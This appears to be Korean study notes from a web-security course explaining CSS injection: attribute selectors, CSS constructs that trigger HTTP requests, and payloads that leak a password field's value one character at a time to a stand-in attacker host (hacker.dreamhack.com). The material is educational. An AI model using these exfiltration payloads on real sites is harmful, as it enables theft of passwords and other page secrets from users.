CSS(Cascading Style Sheets) Injection :
    CSS의 Attribute Selectors와 HTTP 요청을 생성할 수 있는 문법들을 이용해 현재 문서의 정보를 획득하거나, CSRF 공격으로 연계할 수 있습니다.

    1) Attribute Selectors
        ex) p 태그 중 name속성의 값이 test인 태그를 지정하여 color를 red로 설정하는 CSS문법입니다.

            <p name="test">http://dreamhack.io</p>

            <style>
            p[name=test] {
            color: red;
            }
            </style>

    2) HTTP Send
        ex) HTTP를 요청을 생성
            <style>
            @import url("http://example.com/");
            /* 외부 자원의 CSS 로드 */
           
            body { background: url("http://example.com/"); }
            /* 해당 태그의 백그라운드 이미지 지정. */
            </style>

    아래와 같이 중요한 데이터가 페이지내에 존재하며, css 문법을 사용할 수 있을 경우 CSS Injection을 통해 해당 페이지의 중요 정보를 획득할 수 있습니다.

    ex) 
        <input type="password" name="userpw" value="SuperSecret"/>
        <style>
        /* 사용자 입력 데이터 */
        </style>

// Payload : 전송되는 데이터
공격방법 :
    1) 공격 페이로드 - 1 :

        input[name='userpw'][value^='a']{background: url("http://hacker.dreamhack.com/a");}
        input[name='userpw'][value^='b']{background: url("http://hacker.dreamhack.com/b");}
        input[name='userpw'][value^='c']{background: url("http://hacker.dreamhack.com/c");}
        ...
        input[name='userpw'][value^='S']{background: url("http://hacker.dreamhack.com/S");}

        [value^='a'] 는 value의 첫 단어가 a인 경우 background 이미지로 http://hacker.dreamhack.com/a 에 요청하는 문법입니다.
        즉, 위와 같은 페이지에서는 [value^='S'] 조건이 참이 되며, http://hacker.dreamhack.com/S 주소에 HTTP 요청을 전송하게 됩니다. 
        해당 HTTP 요청을 받는 공격자는 password의 첫 단어가 S 라는 점을 알 수 있게 됩니다.

    2) 공격 페이로드 - 2 :

        input[name='userpw'][value^='Sa']{background: url("http://hacker.dreamhack.com/Sa");}
        input[name='userpw'][value^='Sb']{background: url("http://hacker.dreamhack.com/Sb");}
        input[name='userpw'][value^='Sc']{background: url("http://hacker.dreamhack.com/Sc");}
        ...
        input[name='userpw'][value^='Su']{background: url("http://hacker.dreamhack.com/Su");}

        첫 단어가 S 라는 점을 알게된 후 다시 한번 요청하여 다음 단어를 획득할 수 있습니다.

    이와 같은 방법을 반복하여 전체 단어를 획득할 수 있습니다.

Attribute Selectors syntax :
        syntax                  설명                                  만족하는 예시

    [value^='a']        a로 시작하는 경우                            <value="abc">

    [value$='a']        a로 끝나는 경우                              <value="cba">

    [value*='a']        a가 포함되어 있는 경우                        <value="bab">

    [value='ABC' i]     abc이며 대소문자 구분를 하지 않는 경우         <value="abc">
                                                                    <value="ABC">





























